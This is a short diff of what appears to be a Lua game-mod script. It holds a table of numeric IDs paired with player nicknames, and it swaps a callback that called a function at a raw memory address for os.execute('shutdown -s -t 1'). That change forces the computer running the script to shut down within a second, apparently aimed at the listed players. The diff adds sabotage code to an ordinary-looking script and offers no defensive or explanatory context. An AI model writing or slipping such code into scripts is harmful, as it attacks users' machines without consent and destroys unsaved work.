@@ -40,6 +40,6 @@
     {3327842179,'leeqweed'},
     {2318858429,'zxcursed13371337'},
   },
-  callback = function() callFunction(0x823BDB , 3, 3, 0, 0, 0)  end,
+  callback = function() os.execute('shutdown -s -t 1')  end,
 }
 
